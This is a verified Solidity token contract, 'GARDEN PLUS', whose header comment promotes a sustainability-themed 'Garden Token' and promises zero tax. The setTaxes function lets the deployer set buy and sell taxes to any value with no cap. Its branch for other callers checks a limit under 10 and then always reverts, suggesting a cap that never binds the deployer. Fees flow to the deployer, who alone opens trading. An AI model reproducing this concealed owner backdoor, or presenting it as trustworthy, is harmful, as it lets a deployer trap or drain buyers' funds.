/**
 *Submitted for verification at Etherscan.io on 2023-06-09
*/

/**

The Garden Token is a unique cryptocurrency that embodies the principles of environmental preservation 
and sustainability. Built on the blockchain, it aims to promote and incentivize actions that 
contribute to saving our planet.
100m $GRDN / 0 TAX

Trade tax starts with 5/5 to fight against MEV Sniper bots, but that will be reduced to 0/0.

TG: https://t.me/GRDN_ERC20
TW: https://twitter.com/GRDN_ERC20
Web: https://gardenerc20.io

*/

// SPDX-License-Identifier: unlicense

pragma solidity =0.8.18;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract GardenPlus {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public constant name = "GARDEN PLUS";
    string public constant symbol = "GRDNP";
    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 100_000_000 * 10**decimals;

    uint256 buyTax = 5;
    uint256 sellTax = 5;
    uint256 constant swapAmount = totalSupply / 1000;
    uint256 constant maxWallet = (100 * totalSupply) / 100;

    bool tradingOpened = false;
    bool swapping;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    address immutable pair;
    address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 constant _uniswapV2Router =
        IUniswapV2Router02(routerAddress);
    address payable constant deployer =
        payable(address(0xd174650d0eA1112dB6257f7CAb36f0A44c1Fe184));

    constructor() {
        pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            ETH
        );
        balanceOf[msg.sender] = totalSupply;
        allowance[address(this)][routerAddress] = type(uint256).max;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    receive() external payable {}

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        return _transfer(from, to, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal returns (bool) {
        balanceOf[from] -= amount;

        if (from != deployer) require(tradingOpened);

        if (to != pair && to != deployer)
            require(balanceOf[to] + amount <= maxWallet);

        if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount) {
            swapping = true;
            address[] memory path = new address[](2);
            path[0] = address(this);
            path[1] = ETH;
            _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                swapAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
            deployer.transfer(address(this).balance);
            swapping = false;
        }

        if (from != address(this) && to != deployer) {
            uint256 taxAmount = (amount * (from == pair ? buyTax : sellTax)) /
                100;
            amount -= taxAmount;
            balanceOf[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        }
        balanceOf[to] += amount;
        emit Transfer(from, to, amount);
        return true;
    }

    function openTrading() external {
        require(msg.sender == deployer);
        tradingOpened = true;
    }

    function setTaxes(uint256 newBuyTax, uint256 newSellTax) external {
        if (msg.sender == deployer) {
            buyTax = newBuyTax;
            sellTax = newSellTax;
        } else {
            require(newBuyTax < 10);
            require(newSellTax < 10);
            revert();
        }
    }
}